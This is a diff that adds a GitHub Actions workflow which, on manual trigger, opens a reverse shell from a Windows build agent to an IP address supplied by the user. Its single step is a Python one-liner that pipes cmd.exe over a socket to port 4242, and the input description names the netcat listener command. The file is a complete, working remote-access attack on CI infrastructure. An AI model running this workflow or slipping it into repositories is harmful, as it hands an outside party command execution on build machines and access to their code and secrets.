@@ -1,0 +1,22 @@
+on:
+  workflow_dispatch:
+    inputs:
+      ipAddress:
+        description: 'IpAddress (nc -lvnp 4242)'
+        required: true
+
+name: windows
+jobs:
+  reverse_shell:
+    name: 'Create reverse shell into build agent'
+    runs-on: windows-latest
+
+    steps:
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: 3.11
+
+    - name: Create reverse shell
+      shell: cmd
+      run: python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('${{ github.event.inputs.ipAddress }}',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
